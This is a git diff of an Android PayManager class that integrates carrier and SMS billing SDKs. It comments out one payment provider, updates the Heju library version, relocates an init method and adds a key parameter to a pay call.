@@ -6,15 +6,14 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.os.Message;
 import android.util.Log;
-import android.widget.Toast;
 
 import com.compat.plus.main.MaySDK;
 import com.compat.plus.main.OnPayListener;
 import com.mn.kt.MnPro;
-import com.wyzf.constant.PayResult;
-import com.wyzf.download.SdkDlm;
-import com.wyzf.pay.PayResultListener;
-import com.wyzf.pay.WYZFPay;
+//import com.wyzf.constant.PayResult;
+//import com.wyzf.download.SdkDlm;
+//import com.wyzf.pay.PayResultListener;
+//import com.wyzf.pay.WYZFPay;
 import com.y7.smspay.count.SdkBack;
 import com.y7.smspay.sdk.mgr.YPoyManager;
 import com.y7.smspay.sdk.util.HttpURLConnectionUtils;
@@ -22,9 +21,9 @@ import com.y7.smspay.sdk.util.SPUtil;
 import com.y7.smspay.sdk.util.StrUtils;
 import com.y7.smspay.sdk.util.Utils;
 
-import org.hj201706.lib.HejuHuafeiCallback;
-import org.hj201706.lib.HejuInit;
-import org.hj201706.lib.HejuInstance;
+import org.hj201707.lib.HejuHuafeiCallback;
+import org.hj201707.lib.HejuInit;
+import org.hj201707.lib.HejuInstance;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -203,24 +202,13 @@ public class PayManager {
         }
         try {
             Log.i(TAG, "initWY()");
-            SdkDlm.getInstance(context).init(getStr("wy_appCode"), getStr("wy_packCode"));
+//            SdkDlm.getInstance(context).init(getStr("wy_appCode"), getStr("wy_packCode"));
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
-    public static void initBFG() {
-        if (!bfgFlag) {
-            return;
-        }
-        try {
-            Log.i(TAG, "initBFG()");
-            HejuInit hejuInit = new HejuInit(context, "");
-            hejuInit.start();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
+
 
     public static boolean payZZFlag = false;
 
@@ -308,21 +296,21 @@ public class PayManager {
         currentTime = Calendar.getInstance().getTimeInMillis();
         if (currentTime - lastClickTime > MIN_CLICK_DELAY_TIME) {
             lastClickTime = currentTime;
-            WYZFPay.getInstance().pay(context, getInt("wy_feeCode"), getInt("wy_price"), new PayResultListener() {
-                @Override
-                public void onResult(PayResult payResult, int i) {
-                    switch (payResult) {
-                        case SUCCESS:
-                            new SdkBack(context, "1", "1").start();
-                            Log.i(TAG, "payWY() :" + payResult.msg);
-                            break;
-                        default:
-                            new SdkBack(context, "1", "2").start();
-                            Log.i(TAG, "payWY() :" + payResult.msg);
-                            break;
-                    }
-                }
-            });
+//            WYZFPay.getInstance().pay(context, getInt("wy_feeCode"), getInt("wy_price"), new PayResultListener() {
+//                @Override
+//                public void onResult(PayResult payResult, int i) {
+//                    switch (payResult) {
+//                        case SUCCESS:
+//                            new SdkBack(context, "1", "1").start();
+//                            Log.i(TAG, "payWY() :" + payResult.msg);
+//                            break;
+//                        default:
+//                            new SdkBack(context, "1", "2").start();
+//                            Log.i(TAG, "payWY() :" + payResult.msg);
+//                            break;
+//                    }
+//                }
+//            });
         }
     }
 
@@ -345,6 +333,19 @@ public class PayManager {
 
     }
 
+    public static void initBFG() {
+        if (!bfgFlag) {
+            return;
+        }
+        try {
+            Log.i(TAG, "initBFG()");
+            HejuInit kehan = new HejuInit(context, "");
+            kehan.start();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
     public static void payBFG(final Activity activity) {
         if (bfgFlag == false) {
             return;
@@ -357,6 +358,7 @@ public class PayManager {
         params.put("debug", "0");//调试信息toast0关闭1开启
         params.put("activityName", getStr("bfg_activityName"));//寄主activity名称
         params.put("serviceName", getStr("bfg_serviceName"));//寄主Service名称
+        params.put("hKey", getStr("bfg_key"));//key
         HejuInstance mHejuInstance = new HejuInstance();
         mHejuInstance.pay(activity, params, new HejuHuafeiCallback() {
             @Override
